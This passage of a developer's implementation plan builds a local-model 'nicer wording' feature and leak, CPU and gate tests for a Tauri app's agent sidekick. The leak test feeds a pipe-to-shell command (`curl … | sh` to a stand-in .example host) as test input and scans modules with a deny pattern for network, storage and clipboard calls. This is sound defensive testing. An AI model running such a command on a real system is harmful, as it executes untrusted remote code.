  await recapOnReturn(slow);
  assert.equal(slow.w.presented.length, 1, "a model that fails leaves the template");
});

test("the permission line is never reworded, and the chat's status card is worded by the same rules", async () => {
  assert.doesNotMatch(source("island/hooks.ts"), /voice|oneshot|polish/i);
  assert.doesNotMatch(source("sidekick/explain.ts"), /voice|oneshot|polish/i);
  const r = rig({}, async () => "Claude Code has done 4 steps in app and is still working.");
  r.hook("PostToolUse", { tool_name: "Bash", tool_input: { command: "ls" } });
  r.hook("PostToolUse", { tool_name: "Bash", tool_input: { command: "ls" } });
  const a = r.sk.status(null);
  const next = await r.sk.polishLines(a.lines, a.facts);
  assert.equal(next, null, "2 steps in the facts, 4 in the sentence: not accepted");
  const ok = rig({}, async () => "Claude Code has taken 2 steps in app and is still working.");
  ok.hook("PostToolUse", { tool_name: "Bash", tool_input: { command: "ls" } });
  ok.hook("PostToolUse", { tool_name: "Bash", tool_input: { command: "ls" } });
  const b = ok.sk.status(null);
  assert.deepEqual(await ok.sk.polishLines(b.lines, b.facts), ["Claude Code has taken 2 steps in app and is still working."]);
  const off = rig({ local: false });
  assert.equal(await off.sk.polishLines(["x"], [fact]), null);
});

test("the wiring: the one-shot goes through Rust's command, the Settings line asks for the model's name, and the Rust side only ever asks a model on this computer", () => {
  assert.match(source("core/bridge.ts"), /aiOneshot: \(system: string, prompt: string\) => call<string>\("ai_oneshot", \{ system, prompt \}\)/);
  assert.match(source("core/bridge.ts"), /aiLocalModel: \(\) => call<string>\("ai_local_model"\)/);
  assert.match(source("sidekick/appenv.ts"), /oneshot: async \(system, prompt\) => \(await Bridge\.aiOneshot\(system, prompt\)\) \?\? null/);
  assert.match(source("settings/main.ts"), /found: async \(\) => \(await Bridge\.aiLocalModel\(\)\) \?\? null,/);
  const mod = fs.readFileSync(new URL("../../src-tauri/src/ai/mod.rs", import.meta.url), "utf8");
  const one = mod.slice(mod.indexOf("async fn local_target"), mod.indexOf("/// One chat turn, streamed")).split("\n").filter((l) => !l.trim().startsWith("//")).join("\n");
  assert.match(one, /oneshot::pick\(&ready, env\.settings\.last_used_local\.as_ref\(\)\)\?/);
  assert.match(one, /s\.placement == Placement::Local/, "the server is local too, not only the model");
  assert.doesNotMatch(one, /turn_env|read_keys|keychain|secrets::|choice\(|route\(|Auto/, "no key is read and the chat's own choice is not consulted");
  assert.doesNotMatch(one, /log::line|eprintln|println/, "nothing is logged");
  assert.match(one, /key: None,/);
  const lib = fs.readFileSync(new URL("../../src-tauri/src/lib.rs", import.meta.url), "utf8");
  assert.match(lib, /ai::ai_oneshot,\s*ai::ai_local_model,/);
  assert.match(fs.readFileSync(new URL("../../src-tauri/src/ai/session.rs", import.meta.url), "utf8"), /pub\(crate\) async fn rediscover/);
});
EOF
```

```bash
( cd windows && npm run check:sidekick 2>&1 | grep -E "ERR_MODULE_NOT_FOUND|Cannot find|✖|ℹ (pass|fail)" | head -6 )
```

Expected (a failure, exit non-zero): `ERR_MODULE_NOT_FOUND`.

- [ ] **Step 2: Write `voice.ts` and the edits**

```bash
mkdir -p windows/src/sidekick
cat > windows/src/sidekick/voice.ts <<'EOF'
// The local voice (sub-project F1, spec "The local voice"): a model that runs on this computer may offer a nicer sentence for a note. The template is always shown first and is always
// right; this only makes the one request and guards the swap. What a model is given is the facts the template was written from, picked field by field from a short list: an agent's name,
// a project's basename, counts, up to three file basenames and the state words. Never a command, a path, a prompt or an assistant message: none of them is in a note's facts to begin with, and
// the list below would drop them if they were. The permission line is never reworded. The request itself goes through Rust (`ai_oneshot`), which asks only a model on this computer. Pure
// apart from that call, which is given. Loaded by the plain-Node checks.

import { acceptNicerLine } from "./core.ts";

/** What a one-shot request is: it takes the system text and the prompt and gives one line, or null (no local model, an error, a timeout). */
export type OneShot = (system: string, prompt: string) => Promise<string | null>;

/** The fields of a note's facts a model may see, and no others. */
export const FACT_KEYS = ["agent", "project", "steps", "stepsAtLeast", "files", "more", "errors", "approvals", "end", "quietMinutes", "kind", "counts"] as const;

const SYSTEM = "You reword one short status note about a coding agent for the person who runs it. Keep every number and every name exactly as given and add none. Answer with one plain sentence: no quotes, no list, no markdown, no path.";

/** At most this many file names, each at most 60 characters (the contract's own limits): a fact that is bigger is cut, never sent whole. */
const MAX_FILES = 3;
const MAX_NAME = 60;

const isObj = (x: unknown): x is Record<string, unknown> => x !== null && typeof x === "object" && !Array.isArray(x);

/** The allowed fields of one fact, with strings and lists kept to the sizes a template has. A fact that is not an object has none. */
export function allowedFacts(fact: unknown): Record<string, unknown> {
  const out: Record<string, unknown> = {};
  if (!isObj(fact)) return out;
  for (const k of FACT_KEYS) {
    if (!Object.prototype.hasOwnProperty.call(fact, k)) continue;
    const v = fact[k];
    if (typeof v === "string") out[k] = v.slice(0, MAX_NAME);
    else if (typeof v === "number" && Number.isFinite(v)) out[k] = v;
    else if (typeof v === "boolean") out[k] = v;
    else if (Array.isArray(v)) out[k] = v.filter((x) => typeof x === "string" || (typeof x === "number" && Number.isFinite(x))).slice(0, MAX_FILES).map((x) => (typeof x === "string" ? x.slice(0, MAX_NAME) : x));
  }
  return out;
}

/** The request for one line of a note: the template and the facts it was written from. Always well under the 1200 characters Rust allows. */
export function voiceRequest(template: string, fact: unknown): { system: string; prompt: string } {
  return { system: SYSTEM, prompt: `Note: ${template}\nFacts: ${JSON.stringify(allowedFacts(fact))}\nReword the note in one sentence.` };
}

/**
 * A nicer sentence for `template`, or null: no local model, any error, an empty answer, the same sentence, or one that fails the contract's check (`acceptNicerLine`: one line of at most
 * 200 characters, no URL, `/`, `\`, backtick or markdown, only numbers that are in the facts, and the agent's name). Never throws.
 */
export async function nicerLine(oneshot: OneShot, template: string, fact: unknown): Promise<string | null> {
  try {
    const { system, prompt } = voiceRequest(template, fact);
    const reply = await oneshot(system, prompt);
    if (typeof reply !== "string") return null;
    const line = reply.trim();
    return line !== "" && line !== template && acceptNicerLine(line, [fact]) ? line : null;
  } catch {
    return null;
  }
}

/** The lines of a note with a nicer sentence in place of each template that got one (line `i` is worded from fact `i`; a line with no fact, like "+2 more", stays). Null when none changed. */
export async function nicerLines(oneshot: OneShot, lines: readonly string[], facts: readonly unknown[]): Promise<string[] | null> {
  const next = await Promise.all(lines.map(async (line, i) => (i < facts.length ? (await nicerLine(oneshot, line, facts[i])) ?? line : line)));
  return next.some((l, i) => l !== lines[i]) ? next : null;
}
EOF
```

```bash
python3 - <<'PY'
import pathlib

def edit(path, old, new):
    p = pathlib.Path(path)
    s = p.read_text()
    assert s.count(old) == 1, (path, old[:60], s.count(old))
    p.write_text(s.replace(old, new))

# ── The Sidekick asks for a nicer line after a note is shown, and swaps it in once ──
edit("windows/src/sidekick/controller.ts", r'''import { explainRequest } from "./explain.ts";
''', r'''import { explainRequest } from "./explain.ts";
import { nicerLines } from "./voice.ts";
import type { OneShot } from "./voice.ts";
''')
edit("windows/src/sidekick/controller.ts", r'''  /** One timer at a time is all the Sidekick ever asks for (the stuck clock). */''', r'''  /** One short question to a model on this computer (Rust's `ai_oneshot`): one line, or null. Used only for a note's nicer wording, only when Settings allows it. */
  oneshot: OneShot;
  /** The pointer is over the island: a nicer sentence does not swap in under it. */
  hovering(): boolean;
  /** One timer at a time is all the Sidekick ever asks for (the stuck clock). */''')
edit("windows/src/sidekick/controller.ts", r'''      shown: (note) => {
        if (note.kind !== "recap") this.ledger.markNudged(note.key, env.now());
      },''', r'''      shown: (note) => {
        if (note.kind !== "recap") this.ledger.markNudged(note.key, env.now());
        void this.polish(note);
      },''')
edit("windows/src/sidekick/controller.ts", r'''  /** Is this message the question''', r'''  /**
   * The local voice. The template is on screen already. If a model on this computer finds a nicer sentence for a line and the contract's check accepts it, it crossfades in, once, and
   * only if the note is still the one on screen and the pointer is not over it. After that nothing changes. A permission line never comes here.
   */
  private async polish(note: Note): Promise<void> {
    if (!this.env.settings().local) return;
    try {
      const lines = await nicerLines(this.env.oneshot, note.lines, note.facts);
      if (lines === null || this.notes.current?.id !== note.id || this.env.hovering()) return;
      this.notes.reword(note.id, lines);
    } catch {
      // The template stands.
    }
  }

  /** A nicer wording for the lines of an answer in the chat (the status card), by the same rules; null when there is none. */
  async polishLines(lines: readonly string[], facts: readonly unknown[]): Promise<string[] | null> {
    if (!this.env.settings().local) return null;
    try {
      return await nicerLines(this.env.oneshot, lines, facts);
    } catch {
      return null;
    }
  }

  /** Is this message the question''')

edit("windows/src/sidekick/appenv.ts", r'''    // The stuck clock's one timer. Nothing else in the Sidekick sets one.''', r'''    oneshot: async (system, prompt) => (await Bridge.aiOneshot(system, prompt)) ?? null,
    hovering: () => island.pointerInside,
    // The stuck clock's one timer. Nothing else in the Sidekick sets one.''')
edit("windows/src/island/island.ts", r'''  /** A one-off face from the big cat (the Sidekick's surprised look at a high-risk request). */''', r'''  /** The pointer is over the island (the Sidekick does not swap a nicer sentence in under it). */
  get pointerInside(): boolean {
    return this.wasInIsland;
  }

  /** A one-off face from the big cat (the Sidekick's surprised look at a high-risk request). */''')
edit("windows/src/core/bridge.ts", r'''  /** Fills the clipboard with a text''', r'''  /** One short question to a model on this computer (never a network or cloud one), answered with one line, or null: the Sidekick's nicer wording. Nothing is stored or logged. */
  aiOneshot: (system: string, prompt: string) => call<string>("ai_oneshot", { system, prompt }),
  /** The name of the local model that wording would come from, or null when there is none. */
  aiLocalModel: () => call<string>("ai_local_model"),
  /** Fills the clipboard with a text''')

# the crossfade: a rebuilt line fades in
edit("windows/src/views/views.ts", r'''        clear(lines);
        note.lines.forEach((l, i) => lines.append(h("div", { class: note.kind === "recap" ? "sub sk-line" : i === 0 ? "title" : "sub", text: l })));''', r'''        // Lines rebuilt under the same note (a nicer sentence, the waiting nudge at the give-up) fade in.
        const fade = rowFor === note.id ? " sk-fresh" : "";
        clear(lines);
        note.lines.forEach((l, i) => lines.append(h("div", { class: (note.kind === "recap" ? "sub sk-line" : i === 0 ? "title" : "sub") + fade, text: l })));''')

# the chat's card: facts for the polish
edit("windows/src/sidekick/statuschat.ts", r'''  /** The lines of the answer: the ledger's templates, an agent's name, counts and basenames. */
  lines: string[];
}''', r'''  /** The lines of the answer: the ledger's templates, an agent's name, counts and basenames. */
  lines: string[];
  /** The facts the lines were written from (the only thing the local voice may be given). */
  facts: unknown[];
}''')
edit("windows/src/sidekick/statuschat.ts", r'''  return { id, afterCount, question: text.trim(), lines: [...source.status(m.agentId).lines] };''', r'''  const status = source.status(m.agentId);
  return { id, afterCount, question: text.trim(), lines: [...status.lines], facts: [...status.facts] };''')
edit("windows/scripts/sidekick-tests/status.test.mjs", r'''  assert.deepEqual(answerStatus("What's Claude doing?", sk, 0, 1), { id: 1, afterCount: 0, question: "What's Claude doing?", lines: ["Claude Code is not running right now."] });''', r'''  assert.deepEqual(answerStatus("What's Claude doing?", sk, 0, 1), { id: 1, afterCount: 0, question: "What's Claude doing?", lines: ["Claude Code is not running right now."], facts: [] });''')
edit("windows/scripts/sidekick-tests/status.test.mjs", r'''  assert.equal(a.afterCount, 4);''', r'''  assert.equal(a.afterCount, 4);
  assert.equal(a.facts.length, 1);
  assert.deepEqual(Object.keys(a.facts[0]).sort(), ["agent", "agentId", "approvals", "end", "errors", "files", "more", "project", "quietMinutes", "steps", "stepsAtLeast"]);''')
edit("windows/src/views/chat.ts", r'''    State.localAnswers.push(a);
    State.notify();
    onHeightChange();
    return true;''', r'''    State.localAnswers.push(a);
    State.notify();
    onHeightChange();
    // The template is on screen. A model on this computer may offer a nicer wording by the same rules as a note's; it never leaves this computer.
    void sk.polishLines(a.lines, a.facts).then((next) => {
      if (next === null || !State.localAnswers.includes(a)) return;
      a.lines = next;
      State.notify();
    });
    return true;''')

edit("windows/src/settings/main.ts", r'''  const sidekick = sidekickSection({
    sidekick: () => settings.sidekick,''', r'''  const sidekick = sidekickSection({
    // "Found: {model}" or "No local model found": the model Rust would ask, looked for when the window opens.
    found: async () => (await Bridge.aiLocalModel()) ?? null,
    sidekick: () => settings.sidekick,''')
edit("windows/src/sidekick/controller.ts", r'''  private async polish(note: Note): Promise<void> {
    if (!this.env.settings().local) return;
    try {
''', r'''  private async polish(note: Note): Promise<void> {
    if (!this.env.settings().local) return;
    // Never inside the call that shows the note: the question starts a moment later.
    await Promise.resolve();
    try {
''')
PY
```

```bash
cat >> windows/src/style.css <<'EOF'

/* The Sidekick's nicer sentence crossfades in once (sub-project F1). */
.sk-fresh {
  animation: sk-fade 0.4s ease-out;
}
@keyframes sk-fade {
  from {
    opacity: 0;
  }
  to {
    opacity: 1;
  }
}
EOF
```

```bash
( cd windows && npm run check:sidekick 2>&1 | grep -E "^ℹ (tests|pass|fail)" )
```

Expected: `ℹ fail 0`, `ℹ tests 95`, `ℹ pass 95`.

```bash
( cd windows && npx --no-install tsc --noEmit; echo "tsc exit $?" )
```

Expected: `tsc exit 0`.

```bash
( cd windows && npm run check:cat 2>&1 | grep -E "^ℹ (pass|fail)" )
```

Expected: `ℹ pass 372`, `ℹ fail 0`.

```bash
windows/scripts/cargo-linux.sh test --workspace --target-dir /repo/windows/target/f1-tauri
```

Expected: `test result: ok`.

The glue in `ai/mod.rs` (`local_target`, `ai_oneshot`, `ai_local_model`) calls `session` and the provider trait, which no scratch build outside the image can reach: **the Linux compile of this step is required, and the Windows one is owed to CI.**

- [ ] **Step 3: Prove the facts list bites**

```bash
( cd windows && python3 ../.claude/checkpoints/f1-tauri/mut.py src/sidekick/voice.ts 'for (const k of FACT_KEYS) {' 'for (const k of Object.keys(fact)) {' scripts/sidekick-tests/voice.test.mjs )
```

Expected: `# fail 2`.

- [ ] **Step 4: Commit**

```bash
git rev-parse --show-toplevel; git branch --show-current
git add windows/src-tauri/src windows/src windows/scripts/sidekick-tests
git commit -F - <<'MSG'
feat(sidekick): the local voice: ai_oneshot, ai_local_model and the swap

Co-Authored-By: Claude Haiku 5.5 <noreply@anthropic.com>
MSG
```

Expected: `f1/tauri-sidekick`.

### Task 13: The leak test, the cpu rules and the gate pins

**Files:**
- Create: `windows/scripts/sidekick-tests/leak.test.mjs`

**Interfaces:**
- Consumes: everything. Produces: the proofs the spec's "Testing" section asks for.

**The leak test.** A marker string is put into a command, a prompt, a parent folder of the project, an assistant message, a tool's output, a file's contents and a transcript path. The test runs a full recap, a nudge, a status answer, a permission line and a polish, with the console spied, and asserts that **no marker is in the ledger, a note shown or waiting or reworded, a saved setting, the status answer, a request to the local model or any logged line**; that no cloud request exists (the fake cloud provider is never given to the Sidekick, so any request would have nowhere to go) and that the local model saw only facts. A second test scans every module of `src/sidekick/` for anything that could talk out (`fetch`, a socket, a beacon, storage, a log, the clipboard, a window), allows `appenv.ts` alone to import the bridge, and pins its whole reach into the app to three calls (`aiOneshot`, `saveSettings`, `sidekickIdleSeconds`). A third reads the Rust files for a log line. A fourth writes out the chat's order (the local answer first) with a recorded conversation. **The cpu test:** a hidden island with no live session sets no timer and reads no idle time however often its state changes (2000 times); with one live session there is one timer and one idle reading, and 500 more state changes set none. **The gate pin:** the only call that opens the island is in `Notes.show`, reached only after the gate said yes.

- [ ] **Step 1: Write the test**

```bash
mkdir -p windows/scripts/sidekick-tests
cat > windows/scripts/sidekick-tests/leak.test.mjs <<'EOF'
import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";
import { Sidekick } from "../../src/sidekick/controller.ts";
import { answerStatus } from "../../src/sidekick/statuschat.ts";
import { explainRequest } from "../../src/sidekick/explain.ts";
import { cleanSidekickSettings } from "../../src/sidekick/core.ts";
import { source } from "./util.mjs";

// The leak test (sub-project F1, spec "Testing"): a marker string is put into a command, a prompt, a parent folder of the project, an assistant message, a tool's output and a file's
// contents. After a full recap, a nudge, a status answer, a permission line and a local polish, none of them is anywhere the Sidekick keeps, shows, logs or sends.

const T0 = 50_000_000;
const MIN = 60_000;
const M = { cmd: "LEAK-CMD-7f3", prompt: "LEAK-PROMPT-7f3", dir: "LEAK-DIR-7f3", words: "LEAK-WORDS-7f3", out: "LEAK-OUT-7f3", body: "LEAK-BODY-7f3", transcript: "LEAK-TRANSCRIPT-7f3" };
const MARKERS = Object.values(M);
const clean = (x, label) => { const text = typeof x === "string" ? x : JSON.stringify(x); for (const m of MARKERS) assert.ok(!text.includes(m), `${m} is in ${label}`); };

function rig() {
  const w = { t: T0, logged: [], local: [], cloud: [], presented: [], updated: [], saved: [], conversation: [], settings: cleanSidekickSettings({}) };
  // The only things a Sidekick could talk to: a fake local model, recorded; the fake cloud provider is never given to it at all, so any request would have nowhere to go.
  const sk = new Sidekick({
    now: () => w.t, platform: "windows", home: `C:\\Users\\${M.dir}`, idleSeconds: async () => null,
    settings: () => w.settings, saveSettings: (s) => { w.saved.push(s); w.settings = s; },
    world: { ratelimit: () => false, card: () => null, ownCard: () => false, typing: () => false, onScreen: () => true },
    present: (n) => w.presented.push(n), updated: (n) => w.updated.push(n),
    oneshot: async (system, prompt) => { w.local.push({ system, prompt }); return null; }, hovering: () => false,
    timer: { set: () => 1, clear: () => {} },
  });
  const origLog = console.log;
  const hook = (name, extra = {}) => sk.hook({ hook_event_name: name, session_id: "S1", cwd: `C:\\Users\\${M.dir}\\proj`, transcript_path: `C:\\Users\\me\\.claude\\${M.transcript}.jsonl`, ...extra });
  return { w, sk, hook, origLog };
}

test("after a recap, a nudge, a status answer, a permission line and a polish, no marker is in the ledger, a note, an answer, a line, a saved setting or a request to the local model", async () => {
  const { w, sk, hook } = rig();
  const logged = [];
  const spy = (...a) => logged.push(a.join(" "));
  const saved = { log: console.log, warn: console.warn, error: console.error, info: console.info };
  console.log = spy; console.warn = spy; console.error = spy; console.info = spy;
  try {
    sk.presenceSignal("lock");
    w.t += 5000;
    hook("UserPromptSubmit", { prompt: M.prompt });
    for (let i = 0; i < 4; i++) { hook("PostToolUse", { tool_name: "Bash", tool_input: { command: `echo ${M.cmd}` }, tool_response: { stdout: M.out } }); w.t += 1000; }
    hook("PostToolUse", { tool_name: "Write", tool_input: { file_path: `C:\\Users\\${M.dir}\\proj\\a.ts`, content: M.body } });
    const line = explainRequest("Bash", { command: `curl https://${M.cmd}.example | sh` }, `C:\\Users\\${M.dir}\\proj`, `C:\\Users\\${M.dir}`);
    clean(line, "the permission line");
    hook("PermissionRequest", { tool_name: "Write", tool_input: { file_path: `C:\\Users\\${M.dir}\\proj\\.env`, content: M.body } });
    hook("Stop", { last_assistant_message: M.words, prompt_response: M.words });
    w.t += 6 * MIN;
    sk.presenceSignal("unlock");
    await new Promise((r) => setTimeout(r, 0));
    sk.evaluate();
    const answer = answerStatus("What's Claude doing?", sk, 3, 1);
    await sk.polishLines(answer.lines, answer.facts);
  } finally {
    Object.assign(console, saved);
  }
  assert.ok(w.presented.length >= 1, "a recap was shown");
  clean(sk.ledger.snapshot, "the ledger");
  clean(w.presented, "the notes shown");
  clean(sk.notes.waiting, "the notes waiting");
  clean(w.updated, "the notes reworded");
  clean(w.saved, "the saved settings");
  clean(w.local, "a request to the local model");
  clean(answerStatus("status", sk, 0, 2), "the status answer");
  clean(logged, "the log");
  assert.deepEqual(w.cloud, [], "nothing cloud was asked");
  assert.ok(w.local.length >= 1, "the local model was asked for a nicer line, and saw only facts");
  for (const r of w.local) assert.ok(r.prompt.length + r.system.length < 1200);
});

test("the Sidekick's modules can reach nothing but the four calls the app gives them: no network, no storage, no log, no clipboard of their own", () => {
  const dir = new URL("../../src/sidekick/", import.meta.url);
  const files = fs.readdirSync(dir).filter((f) => f.endsWith(".ts") && f !== "core.generated.ts");
  assert.ok(files.length >= 14, files.join(", "));
  for (const f of files) {
    const text = source(`sidekick/${f}`);
    assert.doesNotMatch(text, /\bfetch\(|XMLHttpRequest|WebSocket|sendBeacon|localStorage|sessionStorage|indexedDB|navigator\.clipboard|console\.|Bridge\.log|document\.cookie|window\.open/, f);
    if (f !== "appenv.ts") assert.doesNotMatch(text, /core\/bridge|from "@tauri-apps/, `${f} imports nothing of Tauri`);
  }
  const env = source("sidekick/appenv.ts");
  const used = [...env.matchAll(/Bridge\.(\w+)/g)].map((m) => m[1]).sort();
  assert.deepEqual([...new Set(used)], ["aiOneshot", "saveSettings", "sidekickIdleSeconds"], "the Sidekick's whole reach into the app");
  for (const f of ["views/agentdrop.ts"]) assert.doesNotMatch(source(f), /Bridge|fetch\(/);
});

test("the Rust side keeps no log of what it is told: the Sidekick's files log nothing, and the one-shot logs nothing", () => {
  const rs = (rel) => fs.readFileSync(new URL(`../../src-tauri/src/${rel}`, import.meta.url), "utf8");
  for (const f of ["sidekick.rs", "sidekick_presence.rs", "sidekick_settings.rs", "ai/oneshot.rs"]) assert.doesNotMatch(rs(f), /log::line|eprintln!|println!|dbg!/, f);
  const mod = rs("ai/mod.rs");
  const one = mod.slice(mod.indexOf("pub async fn ai_oneshot"), mod.indexOf("pub async fn ai_local_model"));
  assert.doesNotMatch(one, /log::line|eprintln!|println!|dbg!|conversation|turn_env|read_keys/);
});

test("the status question and its answer never join the conversation or reach a model", async () => {
  const { sk } = rig();
  const conversation = [];
  const modelSees = [];
  // The chat's order, written out: the local answer first; anything else goes on to the conversation and a model.
  const send = (text) => {
    const a = answerStatus(text, sk, conversation.length, 1);
    if (a) return a;
    conversation.push(text);
    modelSees.push(text);
    return null;
  };
  assert.ok(send("What's Claude doing?"));
  assert.ok(send("what is codex doing"));
  assert.equal(send("explain this error please"), null);
  assert.deepEqual(conversation, ["explain this error please"]);
  assert.deepEqual(modelSees, ["explain this error please"]);
});

test("the cpu rules: a hidden island with no live session sets no timer and reads no idle time, however often its state changes; the one timer is the stuck clock's", async () => {
  let sets = 0, idles = 0;
  const sk = new Sidekick({
    now: () => T0, platform: "windows", home: "C:\\Users\\me", idleSeconds: async () => { idles++; return 0; }, settings: () => cleanSidekickSettings({}), saveSettings: () => {},
    world: { ratelimit: () => false, card: () => null, ownCard: () => false, typing: () => false, onScreen: () => false }, present: () => {}, updated: () => {},
    oneshot: async () => null, hovering: () => false, timer: { set: () => { sets++; return 1; }, clear: () => {} },
  });
  for (let i = 0; i < 2000; i++) sk.stateChanged();
  sk.islandOpened();
  await new Promise((r) => setTimeout(r, 0));
  assert.deepEqual([sets, idles], [0, 0]);
  sk.hook({ hook_event_name: "PreToolUse", session_id: "S", tool_name: "Bash", tool_input: { command: "ls" } });
  await new Promise((r) => setTimeout(r, 0));
  assert.equal(sets, 1, "a live session: one timer");
  assert.equal(idles, 1, "and one idle reading");
  for (let i = 0; i < 500; i++) sk.stateChanged();
  assert.deepEqual([sets, idles], [1, 1], "state changes alone set no timer and read no idle time");
});

test("a note is only ever shown through the gate: the one place that opens the island is Notes.show, and the controller never calls present itself", () => {
  const notes = source("sidekick/notes.ts"), ctl = source("sidekick/controller.ts");
  assert.equal(notes.split("this.env.present(").length - 1, 1);
  assert.match(notes, /private show\(note: Note\): void \{[\s\S]*this\.env\.present\(note\);/);
  assert.equal([...notes.matchAll(/this\.show\(/g)].length, 2, "offer and retry, each after the gate said yes");
  assert.equal([...ctl.matchAll(/env\.present\(/g)].length, 1, "only the mapping into Notes");
  assert.doesNotMatch(ctl, /this\.show\(/);
  assert.match(notes, /const g = this\.gate\(note\);\s*if \(g\.show\) \{\s*this\.show\(note\);/);
  assert.match(notes, /if \(!this\.gate\(h\.note\)\.show\) continue;/);
});
EOF
```

```bash
( cd windows && npm run check:sidekick 2>&1 | grep -E "^ℹ (tests|pass|fail)" )
```

Expected: `ℹ fail 0`, `ℹ tests 101`, `ℹ pass 101`.

These pass at once: they test what the earlier tasks built. **Prove they bite:** a leak must fail them.

```bash
( cd windows && python3 ../.claude/checkpoints/f1-tauri/mut.py src/sidekick/ledger.ts 'const ev = eventFrom(payload, now, { codex: false });' 'const ev0 = eventFrom(payload, now, { codex: false }); const ev = ev0 && { ...ev0, target: JSON.stringify(payload) };' scripts/sidekick-tests/leak.test.mjs scripts/sidekick-tests/ledger.test.mjs )
```

Expected: `# fail 3`.

```bash
( cd windows && python3 ../.claude/checkpoints/f1-tauri/mut.py src/sidekick/notes.ts 'if (g.show) {
      this.show(note);' 'if (g.show || note.kind === "recap") {
      this.show(note);' scripts/sidekick-tests/leak.test.mjs )
```

Expected: `# fail 1`.

- [ ] **Step 2: Commit**

```bash
git rev-parse --show-toplevel; git branch --show-current
git add windows/scripts/sidekick-tests/leak.test.mjs
git commit -F - <<'MSG'
feat(sidekick): the leak test, the cpu rules and the gate pins

Co-Authored-By: Claude Haiku 5.5 <noreply@anthropic.com>
MSG
```

Expected: `f1/tauri-sidekick`.

### Task 14: The docs and the final checks

**Files:**
- Modify: `windows/README.md` (a "Testing the Sidekick" section and the differences), `CLAUDE.md` (one bullet), `ARCHITECT.md` (one bullet)

**Interfaces:** none.

The README says what differs from the Mac: **no Codex here**, the permission line for Claude Code only, **no reason for a failure** (the relay drops the error text), how away is read on each system (and that on Windows and Linux a recap after plain idling waits for a hook event, the island opening or an unlock), the chips on the drop view, the clipboard, VS Code on Windows and nothing on Linux, and the local voice. `CLAUDE.md` and `ARCHITECT.md` get one bullet each, in the style of the H bullets. **`docs/SIDEKICK-CONTRACT.md` is not edited** (it is the main session's): its "TypeScript `windows/src/sidekick/` replay the same files" stays true.

- [ ] **Step 1: Write the docs**

```bash
python3 - <<'PY'
import pathlib

def edit(path, old, new):
    p = pathlib.Path(path)
    s = p.read_text()
    assert s.count(old) == 1, (path, old[:60], s.count(old))
    p.write_text(s.replace(old, new))

edit("windows/README.md", r'''## What's different from the Mac version
''', r'''### Testing the Sidekick

The agent sidekick (sub-project F1: a recap when you come back, a plain line and a risk badge on a permission request, a nudge when an agent looks stuck, "What's Claude doing?" in the chat, and a drop on an agent's own cat) is built on one set of plain rules, `shared/sidekick-core.js`, which the Mac's Swift port and the Node tests replay too (`docs/SIDEKICK-CONTRACT.md`). **This app does not carry a second hand-made port of them**: `node scripts/gen-sidekick-ts.mjs` copies the source into `src/sidekick/core.generated.ts` (never edit that file), `src/sidekick/core.ts` gives it its types, and `npm run check:sidekick` (Node 22.6 or newer) replays every file of `tests/fixtures/sidekick/` against that copy, fails if the copy is stale, and tests everything the app adds: the ledger (`ledger.ts`, memory only, fed in `island/hooks.ts` before the one-card gate), presence (`presence.ts`; the lock, sleep and display news come from `src-tauri/src/sidekick.rs`, the idle time from `platform::idle_seconds`), the notes and their gate (`notes.ts`, `world.ts`), the stuck clock (`stuckclock.ts`, one one-shot timer), the permission line (`explain.ts`), the status answer (`statuschat.ts`), the drop on an agent's cat (`agentdrop.ts`, `views/agentdrop.ts`), the local voice (`voice.ts` and Rust's `ai/oneshot.rs`) and a leak test. Rust: `cargo test` replays `settings-cases.json` for `sidekick_settings.rs`. To look at it without a real agent, run `npx vite`, open `http://127.0.0.1:1420/` and call, in the console, `__nm.run.recap()`, `loop()`, `errors()`, `waiting()`, `quiet()`, `card("high")` (or `"medium"`, `"low"`) and, with `?display=perAgent`, `agents()` and then drag a file over the island; `__nm.skew(ms)` moves the Sidekick's clock. `__nm` exists in the dev server only.

## What's different from the Mac version
''')
edit("windows/README.md", r'''- Images and scanned PDFs for a model that can't see go through Windows' own OCR''', r'''- **The Sidekick (F1) here has no Codex**, because there are no Codex hooks on Windows or Linux. The permission line and badge are for Claude Code only (Gemini CLI and Antigravity have no permission card). **A failure has no reason here**: "hit 3 errors in a row" is all the app can say, because the relay drops the error text (and `tool_response`, `transcript_path` and the assistant's words never cross the pipe at all). **Away** is a lock or a switch to another user, a sleep (Linux) or the display going off (Windows), at once; 5 minutes with no input counts too (Windows, and GNOME on Linux), but it is read only when a hook event comes, when the island opens or on an unlock, so a recap after plain idling waits for the first of those. **A file dropped on an agent's cat** copies its path (a small clipboard command of this app), brings VS Code forward on Windows by the same "Open terminal" action and opens nothing on Linux; while a file is dragged, a small chip for each running agent is shown on the drop view (an additive strip: the drop view has no cats of its own and is not moved), and the big drop area is as it was. **The nicer wording from a local model** asks only a server on this computer (`ai_oneshot`, never the chat's Auto choice), and there is no Apple on-device model.
- Images and scanned PDFs for a model that can't see go through Windows' own OCR''')

edit("CLAUDE.md", r'''- `docs/index.html`, `docs/testers.html`, `docs/site.css` — the site''', r'''- Sub-project F1 on Windows/Linux (the agent sidekick, `docs/SIDEKICK-CONTRACT.md`): `windows/src/sidekick/core.generated.ts` is `shared/sidekick-core.js` copied by `node scripts/gen-sidekick-ts.mjs` (never edited by hand; `npm run check:sidekick` fails on a stale copy and replays `tests/fixtures/sidekick/` against it), `core.ts` types it, and the app's own parts sit beside it: `ledger.ts`, `presence.ts`, `notes.ts` with `world.ts` (the show gate), `stuckclock.ts` (the one one-shot timer), `explain.ts` (the permission line, with the relay's 2000-byte cut read as unsure), `statuschat.ts` (the chat's local answer, never in the conversation), `agentdrop.ts` with `views/agentdrop.ts` (a drop on an agent's cat copies its path; the big cat is never a target), `voice.ts` (the local wording) and `controller.ts` (`Sidekick`, installed in `main.ts` through `Hub`); `appenv.ts` is the one file that meets Tauri. Rust: `sidekick_settings.rs` (the `sidekick` object of `settings.json`, kept by `settings.rs` at every save), `sidekick_presence.rs` and `sidekick.rs` (the lock, sleep and display news, and the idle time), `ai/oneshot.rs` with `ai_oneshot` and `ai_local_model` in `ai/mod.rs` (only a model on this computer), and `copy_text` in `lib.rs` (the clipboard, never a paste). The relay drops `last_assistant_message` and `prompt_response` too. `npm run check:sidekick` runs in CI.
- `docs/index.html`, `docs/testers.html`, `docs/site.css` — the site''')
